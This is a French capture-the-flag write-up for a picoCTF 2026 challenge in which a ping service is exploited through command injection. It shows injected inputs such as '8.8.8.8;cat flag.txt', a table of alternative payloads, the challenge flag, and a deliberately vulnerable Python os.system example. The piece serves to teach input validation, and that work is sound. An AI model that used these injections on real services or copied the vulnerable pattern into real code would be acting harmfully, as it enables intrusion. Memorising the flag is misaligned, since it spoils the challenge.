# picoCTF 2026 -- ping-cmd

| Champ | Détail |
|---|---|
| **Catégorie** | General Skills |
| **Difficulté** | Easy |
| **Auteur** | YAHAYA MEDDY |

---

## Description

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?

Le serveur expose un service qui prend une adresse IP en entrée et exécute un `ping`. Il prétend n'autoriser que `8.8.8.8`. L'objectif : trouver comment détourner cette fonctionnalité pour exécuter nos propres commandes.

---

## Connexion

```bash
nc mysterious-sea.picoctf.net 52772
```

---

## Analyse & Raisonnement

### Observation initiale

En testant avec l'IP autorisée (`8.8.8.8`), le serveur exécute bien un ping classique :

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.97 ms
...
```

En testant une autre IP (`1.1.1.1`), le ping s'exécute quand même (100% packet loss, mais pas de blocage côté parsing) - ce qui indique que la "sécurité" est soit absente, soit très superficielle.

### Hypothèse

Le serveur construit probablement la commande shell de façon naïve, du genre :

```bash
ping -c 2 <VOTRE_INPUT>
```

Si l'input n'est pas correctement filtrée (pas d'échappement, pas de liste blanche stricte), on peut injecter des commandes supplémentaires via l'opérateur `;` (séparateur de commandes en Bash).

---

## Exploitation - Command Injection

### Étape 1 : Vérification de l'injection

On teste si l'opérateur `;` est interprété par le shell en ajoutant `ls` après l'IP :

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;ls
```

**Résultat :**
```
PING 8.8.8.8 ...
[sortie du ping]
flag.txt
script.sh
```

✅ L'injection fonctionne. Le `ls` s'est exécuté et on voit deux fichiers : `flag.txt` et `script.sh`.

---

### Étape 2 : Lecture du flag

On injecte `cat flag.txt` pour lire le contenu du fichier :

```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'): 8.8.8.8;cat flag.txt
```

**Résultat :**
```
PING 8.8.8.8 ...
[sortie du ping]
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}
```

---

## Flag

```
picoCTF{p1nG_c0mm@nd_3xpL0it_su33essFuL_b75fc848}
```

---

## Explication technique - Pourquoi ça marche ?

Le serveur construit sa commande shell de manière non sécurisée, probablement ainsi :

```python
# Exemple de code vulnérable (Python)
import os
ip = input("Enter an IP address to ping: ")
os.system(f"ping -c 2 {ip}")
```

En fournissant `8.8.8.8;ls` comme input, la commande réellement exécutée devient :

```bash
ping -c 2 8.8.8.8;ls
```

Le shell interprète `;` comme un séparateur : il exécute `ping -c 2 8.8.8.8` d'abord, puis `ls` ensuite. C'est une **injection de commande (Command Injection)**, une vulnérabilité classique listée dans l'**OWASP Top 10** (A03:2021 – Injection).

### Autres payloads qui auraient fonctionné

| Payload | Comportement |
|---|---|
| `8.8.8.8;ls` | Liste les fichiers du répertoire courant |
| `8.8.8.8;cat flag.txt` | Lit le flag |
| `8.8.8.8;id` | Affiche l'utilisateur courant |
| `8.8.8.8;pwd` | Affiche le répertoire de travail |
| `8.8.8.8 && cat flag.txt` | Exécute `cat` seulement si le ping réussit |
| `8.8.8.8 \| cat flag.txt` | Pipe la sortie du ping dans cat |


---

## Ce que j'ai appris

- Le **Command Injection** est l'une des vulnérabilités les plus dangereuses et les plus courantes dans les applications qui construisent des commandes shell à partir d'entrées utilisateur.
- L'opérateur `;` permet de chaîner des commandes arbitraires si l'input n'est pas sanitisée.
- Un filtre basé sur l'affichage d'un message ("we only allow 8.8.8.8") ne garantit **pas** une vraie protection - il faut valider et échapper l'input côté code.

---

*Writeup par [TidiX](https://github.com/Tidjene) - TidiX.Cyber*
